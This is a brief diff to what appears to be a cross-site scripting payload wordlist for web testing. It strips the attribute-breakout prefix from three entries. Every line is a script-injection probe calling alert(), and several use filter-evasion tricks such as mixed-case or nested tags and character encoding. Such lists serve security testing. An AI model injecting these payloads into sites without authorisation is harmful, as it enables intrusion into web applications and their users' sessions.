@@ -1,7 +1,7 @@
 <script>alert('XSS')</script>
-"><script>alert('XSS')</script>
-"><scrIpt>alert(1);</scRipt>
-"><script>alert(String.fromCharCode(88,83,83))</script>
+<script>alert('XSS')</script>
+<scrIpt>alert(1);</scRipt>
+<script>alert(String.fromCharCode(88,83,83))</script>
 </b><scrIpt>alert(1);</scRipt><b>
 <scr<script>ipt>alert('XSS')</scr<script>ipt>
 <script>\u0061lert('22')</script>
